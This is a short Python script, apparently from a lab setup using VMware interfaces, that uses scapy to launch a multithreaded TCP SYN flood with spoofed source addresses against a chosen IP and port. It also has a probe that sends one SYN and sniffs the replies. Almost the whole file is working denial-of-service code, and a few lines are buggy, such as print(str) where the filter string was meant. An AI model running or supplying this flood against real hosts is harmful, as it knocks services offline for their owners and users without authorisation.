# -*- coding: utf-8 -*-
from scapy.all import *
import threading
import time
import random
flag=False

def gen_syn(total,dst_ip,port):
    for i in range(total):
        random_ip = '254.' + '100.' + '200.' + str(random.randrange(0, 255))
        random_sPort = random.randrange(0,1000)
        ip = IP(src=random_ip,dst=dst_ip)
        tcp = TCP(sport=random_sPort,dport=port, flags='S', seq=11111)
        pkt = (ip / tcp)
        yield pkt

# ,iface='VMware Virtual Ethernet Adapter for VMnet8'
def send_pkt(pkt_num,dst_ip,port):
    for pkt in gen_syn(pkt_num,dst_ip,port):
        send(pkt)
        # time.sleep(0.05)



def syn_flood(thread_num,total,dst_ip,port):
    if thread_num==0:
        send_pkt(total,dst_ip,port)
    else:
        name=[]
        pkt_num = int(total / thread_num)
        for i in range(thread_num):
            t = threading.Thread(target=send_pkt, args=(pkt_num, dst_ip, port))
            t.start()
            name.append(t)
        for i in range(thread_num):
            name[i].join()

def one_test(ip,port):
    global flag
    pkt=IP(dst=ip)/TCP(dport=port,flags='S')
    if ip=='192.168.80.130':
        fil = 'ip src ' + ip + ' and tcp port ' + str(port)
        print(str)
        send(pkt, verbose=0,iface='VMware Virtual Ethernet Adapter for VMnet8')
        pkts=sniff(iface='VMware Virtual Ethernet Adapter for VMnet8',filter=fil,count=4,prn=lambda x:x[TCP].show())
        flag=True
    else:
        send(pkt, verbose=0,iface='Qualcomm Atheros AR9485 Wireless Network Adapter')
        fil = 'ip src ' + ip + ' and tcp port ' + str(port)
        print(str)
        pkts=sniff(iface='Qualcomm Atheros AR9485 Wireless Network Adapter',filter=fil,count=4,prn=lambda x:x[TCP].show())
        flag = True

def syn_test(ip,port):
    p=25
    t=threading.Thread(target=one_test,args=(ip,port))
    t.start()
    while(p>0):
        p-=1
        time.sleep(1)
        print(p)
    return




if __name__ == '__main__':
   syn_test('192.168.1.1', 80)
   print(flag)



